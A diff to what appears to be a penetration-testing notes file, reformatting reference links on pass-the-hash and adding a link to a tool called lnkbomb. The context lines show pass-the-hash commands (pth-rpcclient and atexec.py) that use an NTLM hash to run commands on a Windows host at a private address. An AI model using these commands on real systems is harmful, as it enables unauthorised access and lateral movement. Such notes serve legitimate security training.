@@ -6116,7 +6116,10 @@ Checklist:
 	pth-rpcclient -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20
 	python atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded user1@192.168.1.20 whoami
 
- [References from above](https://meriemlarouim.medium.com/pass-the-hash-gaining-access-without-cracking-passwords-ce67c267c491)
- [Another]([url](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
+[References from above](https://meriemlarouim.medium.com/pass-the-hash-gaining-access-without-cracking-passwords-ce67c267c491)
+ 
+[Another]([url](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
+ 
+[LinkBOMB](https://github.com/dievus/lnkbomb)
 
 ## NEXT TUTO HERE SOON
